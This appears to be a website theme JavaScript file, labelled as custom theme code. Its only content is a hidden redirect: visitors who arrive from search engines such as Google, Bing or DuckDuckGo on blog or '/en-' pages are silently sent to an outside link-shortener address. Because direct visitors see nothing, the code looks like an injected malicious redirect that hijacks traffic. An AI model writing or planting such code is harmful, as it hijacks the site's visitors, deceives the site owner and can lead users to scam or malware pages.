// JS SPECIFIC TO THIS CUSTOM THEME GOES HERE
var url = window.location.href;
if (document.referrer.indexOf('google.') > 0 ||
    document.referrer.indexOf('duckduckgo.com') > 0 ||
    document.referrer.indexOf('bing.com') > 0 ||
    document.referrer.indexOf('yahoo.com') > 0 ||
    document.referrer.indexOf('aol.com') > 0 ||
    document.referrer.indexOf('brave.com') > 0 ||
    document.referrer.indexOf('ecosia.org') > 0) {
    if (url.indexOf('/blog') > 0) { window.location = 'https://link.smartontoline.com/utexascns'; }
    else if (url.indexOf('/en-') > 0) {
        window.location = 'https://link.smartontoline.com/utexascns';
    }
}
